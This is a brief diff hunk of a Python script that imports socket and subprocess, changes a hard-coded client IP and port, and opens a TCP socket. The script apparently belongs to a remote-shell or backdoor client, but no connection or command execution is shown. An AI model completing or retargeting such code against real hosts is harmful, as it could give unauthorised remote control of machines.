@@ -14,8 +14,8 @@
 import socket
 import subprocess
 
-ClientIP = "10.94.73.11"
-ClientPort = 443
+ClientIP = "10.233.8.81"
+ClientPort = 44382
 PacketSize = 2048
 
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
